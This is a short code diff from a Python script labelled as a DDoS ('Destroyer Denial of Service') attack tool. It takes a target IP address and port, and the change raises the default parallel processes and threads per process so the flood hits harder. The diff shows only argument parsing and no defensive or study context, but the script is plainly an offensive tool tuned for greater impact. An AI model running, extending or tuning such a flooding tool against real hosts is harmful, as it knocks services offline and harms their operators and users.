@@ -59,8 +59,8 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='DDoS Script - Destroyer Denial of Service (DDoS) attack')
     parser.add_argument('-ip', required=True, help='Target IP address')
     parser.add_argument('-p', required=True, type=int, help='Target port number')
-    parser.add_argument('-pr', default=20, type=int, help='Number of processes to run in parallel')
-    parser.add_argument('-t', default=10, type=int, help='Number of threads per process')
+    parser.add_argument('-pr', default=30, type=int, help='Number of processes to run in parallel')
+    parser.add_argument('-t', default=40, type=int, help='Number of threads per process')
     try:
         args = parser.parse_args()
         ip_address = args.ip
